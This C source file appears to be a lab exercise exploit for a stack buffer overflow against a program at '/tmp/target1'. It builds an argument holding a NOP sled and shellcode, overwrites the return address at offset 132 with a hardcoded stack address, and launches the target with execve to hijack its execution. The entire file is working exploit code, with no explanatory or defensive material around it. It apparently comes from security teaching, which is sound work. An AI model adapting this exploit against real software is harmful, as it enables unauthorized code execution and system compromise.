#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOP 0x90
int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; 
  
  // 132 to reach the return address
  // 4 for the return address
  // 1 for NULL
  args[1] = malloc(137); 

  memset(args[1], NOP, 136);
  args[1][136] = '\0';
  memcpy(args[1], shellcode, strlen(shellcode));
  *(unsigned int *)(args[1] + 132) = 0xbffffd78;

  args[2] = NULL;  
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
